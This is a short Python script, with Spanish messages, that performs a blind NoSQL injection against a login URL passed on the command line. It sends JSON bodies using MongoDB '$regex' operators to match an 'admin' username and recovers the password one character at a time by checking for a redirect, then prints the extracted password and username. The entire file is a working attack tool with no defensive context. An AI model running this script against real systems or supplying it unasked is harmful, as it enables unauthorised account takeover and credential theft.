import requests
import json
import time
import sys

dictionary = '.+*<>{}\\~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()_,;:[]-_'

def getNextChars(url, pfx=''):
    username = ''
    resp = []
    s = requests.Session()
    for ch in dictionary:
        if ch in '.,+*\\[]{}()':
            ch = '\\' + ch
        params = {
            'username': { "$regex": "admin.*" },
            'password': { "$regex": '^' + pfx + ch + '.*' },
        }
        headers = {
            'content-type': 'application/json'
        }
        
        r = s.post(url, headers=headers, data=json.dumps(params), allow_redirects=False)

        if 'Location' in r.headers:
            if ch == '$' and len(resp) == 0:
                return
            username = r.headers['Location'].split('=')[1]
            resp.append(pfx + ch)
            break
    
    if resp:
        print(f"Encontrado: {resp[0]}")
        for r in resp:
            getNextChars(url, r)

    print(f"Username: {username}")
    return resp

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python script.py <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    getNextChars(url)